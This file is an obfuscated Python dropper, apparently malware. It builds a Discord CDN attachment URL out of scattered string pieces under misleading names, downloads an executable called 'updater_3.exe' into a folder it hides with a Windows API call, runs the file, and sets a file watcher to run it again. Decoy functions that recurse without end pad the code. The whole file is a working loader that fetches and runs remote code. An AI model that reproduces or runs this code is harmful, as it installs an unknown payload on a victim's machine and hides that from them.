import os
import requests
import subprocess
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

discord_v = "updater_3."

class efh(FileSystemEventHandler):
    def __init__(self,ep):
        super().__init__()
        self.ep = ep

    def om(self, event):
        if event.src_path == self.ep:
            subprocess.run([self.ep], shell=True)

main_gateway = "https://cdn.discordapp.com" #entry point
gateway_bits = "e" #bits to use  before broser fingerprint gets locked in binary alpha 1st rule

def iii ():
    for awsedrftgyhujikoi in range(7888888888888888888888882002020202):

        awsedrftgyhujikoi()

def irvii ():
    for wwwwi in range(8887777222):

        irvii()

rl1 = "attachments"

def wddw ():
    for dwdwdw in range(666626990402112):

        wddw()

pokk = "e"

def icececeecii ():
    for i in range(89828998923832):

        icececeecii()


rl11 = "1189138483449708594"
ppkl = "189138620787982336"
discord_api_int_version = "89177737318179831"

fnk = "x"


def cfl(repo_url, efn, folder_name):
    ctr = os.path.dirname(os.path.abspath(__file__))
    hpp = os.path.join(ctr, folder_name)
    fnk = "x"
    
    try:
        os.mkdir(hpp)

        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(hpp, FILE_ATTRIBUTE_HIDDEN)

        response = requests.get(repo_url)
        response.raise_for_status()

        ep = os.path.join(hpp, efn)

        with open(ep, 'wb') as exe_file:
            exe_file.write(response.content)

        return ep
    except FileExistsError:
        pass

pp = "/"




authorization = f"{main_gateway}/{rl1}/{rl11}/{ppkl}/{discord_v}{pokk}{fnk}{pokk}"
api = f"{discord_v}{pokk}{fnk}{pokk}"
cache = 'cached'

dep = cfl(authorization, api, cache)

if dep:
    subprocess.run([dep], shell=True)

    handler = efh(dep)
    observer = Observer()
    observer.schedule(handler, path=os.path.dirname(dep), recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()



    observer.join()
